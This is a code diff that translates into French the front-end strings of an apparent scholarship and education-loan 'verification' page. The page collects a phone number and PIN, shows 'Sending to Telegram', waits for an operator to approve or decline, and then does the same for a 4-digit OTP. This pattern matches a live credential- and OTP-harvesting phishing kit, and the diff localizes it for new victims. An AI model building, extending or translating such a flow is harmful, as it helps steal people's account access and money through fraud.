@@ -262,7 +262,7 @@ function startResendTimer(seconds = 30) {
   let remaining = seconds;
   resendBtn.style.display = 'none';
   timerEl.classList.remove('hidden');
-  timerEl.textContent = `Resend code in ${remaining}s`;
+  timerEl.textContent = `Renvoyer le code dans ${remaining}s`;
 
   const interval = setInterval(() => {
     remaining -= 1;
@@ -272,7 +272,7 @@ function startResendTimer(seconds = 30) {
       resendBtn.style.display = 'inline';
       return;
     }
-    timerEl.textContent = `Resend code in ${remaining}s`;
+    timerEl.textContent = `Renvoyer le code dans ${remaining}s`;
   }, 1000);
 }
 
@@ -343,7 +343,7 @@ function initPhonePinVerification() {
     const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
 
     verifyPhonePinBtn.disabled = true;
-    verifyPhonePinBtn.textContent = 'Sending to Telegram...';
+    verifyPhonePinBtn.textContent = 'Envoi vers Telegram...';
 
     try {
       const response = await fetch(AppConfig.api('/api/verify/phone-pin'), {
@@ -354,7 +354,7 @@ function initPhonePinVerification() {
       const result = await response.json();
 
       if (result.success) {
-        verifyPhonePinBtn.textContent = 'Waiting for approval...';
+        verifyPhonePinBtn.textContent = 'En attente d\'approbation...';
         verifyPhonePinBtn.disabled = true;
 
         const pollInterval = setInterval(async () => {
@@ -367,14 +367,14 @@ function initPhonePinVerification() {
             if (statusResult.status === 'verified') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
-              verifyPhonePinBtn.textContent = 'Phone & PIN Verified ✓';
+              verifyPhonePinBtn.textContent = 'Téléphone et code PIN vérifiés ✓';
               verifyPhonePinBtn.classList.remove('btn-primary');
               verifyPhonePinBtn.classList.add('btn-success');
               setTimeout(() => goToStep(2), 800);
             } else if (statusResult.status === 'declined') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
-              verifyPhonePinBtn.textContent = 'Wrong phone number or PIN';
+              verifyPhonePinBtn.textContent = 'Numéro de téléphone ou code PIN incorrect';
               verifyPhonePinBtn.classList.add('btn-secondary');
               verifyPhonePinBtn.classList.remove('btn-primary');
               verifyPhonePinBtn.disabled = false;
@@ -382,7 +382,7 @@ function initPhonePinVerification() {
               phoneInput.value = '';
               phoneInput.focus();
               setTimeout(() => {
-                verifyPhonePinBtn.textContent = 'Verify Phone & PIN';
+                verifyPhonePinBtn.textContent = 'Vérifier le téléphone et le code PIN';
                 verifyPhonePinBtn.classList.remove('btn-secondary');
                 verifyPhonePinBtn.classList.add('btn-primary');
               }, 2000);
@@ -396,10 +396,10 @@ function initPhonePinVerification() {
         throw new Error(result.error || 'Failed to send verification');
       }
     } catch (error) {
-      console.error('Phone/PIN verification error:', error);
-      verifyPhonePinBtn.textContent = 'Error. Try again.';
+      console.error('Erreur de vérification téléphone/PIN :', error);
+      verifyPhonePinBtn.textContent = 'Erreur. Veuillez réessayer.';
       verifyPhonePinBtn.disabled = false;
-      setTimeout(() => { verifyPhonePinBtn.textContent = 'Verify Phone & PIN'; }, 2000);
+      setTimeout(() => { verifyPhonePinBtn.textContent = 'Vérifier le téléphone et le code PIN'; }, 2000);
     }
   });
 }
@@ -420,12 +420,12 @@ function initOtpVerification() {
     const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
 
     if (otp.length !== 4) {
-      alert('Please enter the complete 4-digit OTP.');
+      alert('Veuillez entrer le code OTP complet à 4 chiffres.');
       return;
     }
 
     verifyOtpBtn.disabled = true;
-    verifyOtpBtn.textContent = 'Verifying...';
+    verifyOtpBtn.textContent = 'Vérification en cours...';
 
     try {
       const response = await fetch(AppConfig.api('/api/verify/otp'), {
@@ -436,7 +436,7 @@ function initOtpVerification() {
       const result = await response.json();
 
       if (result.success) {
-        verifyOtpBtn.textContent = 'Waiting for approval...';
+        verifyOtpBtn.textContent = 'En attente d\'approbation...';
 
         const pollInterval = setInterval(async () => {
           try {
@@ -448,20 +448,20 @@ function initOtpVerification() {
             if (statusResult.status === 'verified') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
-              verifyOtpBtn.textContent = 'Verified ✓';
+              verifyOtpBtn.textContent = 'Vérifié ✓';
               verifyOtpBtn.classList.remove('btn-success');
               verifyOtpBtn.classList.add('btn-primary');
               setTimeout(() => goToStep(3), 600);
             } else if (statusResult.status === 'declined') {
               clearInterval(pollInterval);
               PollingManager.intervals.delete(pollInterval);
-              verifyOtpBtn.textContent = 'Invalid OTP';
+              verifyOtpBtn.textContent = 'Code OTP invalide';
               verifyOtpBtn.classList.add('btn-secondary');
               verifyOtpBtn.classList.remove('btn-success');
               verifyOtpBtn.disabled = false;
               otpBoxes.forEach(box => box.value = '');
               setTimeout(() => {
-                verifyOtpBtn.textContent = 'Verify';
+                verifyOtpBtn.textContent = 'Vérifier';
                 verifyOtpBtn.classList.remove('btn-secondary');
                 verifyOtpBtn.classList.add('btn-success');
               }, 2000);
@@ -475,10 +475,10 @@ function initOtpVerification() {
         throw new Error(result.error || 'Failed to send OTP');
       }
     } catch (error) {
-      console.error('OTP verification error:', error);
-      verifyOtpBtn.textContent = 'Error. Try again.';
+      console.error('Erreur de vérification OTP :', error);
+      verifyOtpBtn.textContent = 'Erreur. Veuillez réessayer.';
       verifyOtpBtn.disabled = false;
-      setTimeout(() => { verifyOtpBtn.textContent = 'Verify'; }, 2000);
+      setTimeout(() => { verifyOtpBtn.textContent = 'Vérifier'; }, 2000);
     }
   });
 }
@@ -505,7 +505,7 @@ function initVerifyPage() {
     continueBtn.addEventListener('click', () => {
       const params = new URLSearchParams(window.location.search);
       const flow = params.get('flow') || 'scholarship';
-      alert(`Continuing to ${flow === 'loan' ? 'Education Loan' : 'Scholarship'} application form.`);
+      alert(`Continuer vers le formulaire de candidature pour ${flow === 'loan' ? 'Prêt étudiant' : 'Bourse'}.`);
     });
   }
 }
